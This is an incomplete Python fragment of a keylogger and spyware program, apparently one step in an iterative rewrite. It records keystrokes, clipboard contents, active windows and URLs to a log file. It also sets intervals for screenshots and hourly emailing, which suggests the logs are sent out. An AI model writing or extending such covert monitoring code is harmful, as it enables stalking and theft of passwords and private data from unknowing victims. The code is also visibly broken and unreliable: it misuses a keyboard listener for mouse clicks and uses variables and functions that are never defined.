import platform
from pynput import keyboard
import time
import threading
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import win32clipboard
import re
import requests
import psutil
import pyudev
from urllib.parse import urlparse

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour
screenshot_interval = 600  # Capture screenshot every 10 minutes
window_info_interval = 1800  # Capture window info every 30 minutes

current_word = ""
current_line = ""
current_application = ""
screenshot_key = keyboard.Key.print_screen
clipboard_key = keyboard.Key.f9

# ... (same as before)

def on_key_press(key):
    global current_word, current_line, current_application

    # ... (same as before)

    current_application = get_active_application()

    if key == clipboard_key:
        capture_clipboard()

    if len(current_line) >= 50:
        save_current_line()

    if current_url:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [URL: {current_url}] - {current_line}\n')
        current_line = ""

def capture_window_info():
    while True:
        current_application = get_active_application()
        current_url = get_active_url()
        if current_application or current_url:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [Window: {current_application}] - [URL: {current_url}]\n')
        time.sleep(window_info_interval)

# Set up mouse listener
mouse_listener = keyboard.Listener(on_click=on_click)
mouse_listener.start()

# Set up window listener
window_listener = threading.Thread(target=capture_window_title)
window_listener.start()

# Set up window info capture
window_info_thread = threading.Thread(target=capture_window_info)
window_info_thread.start()

# Rest of the code remains unchanged
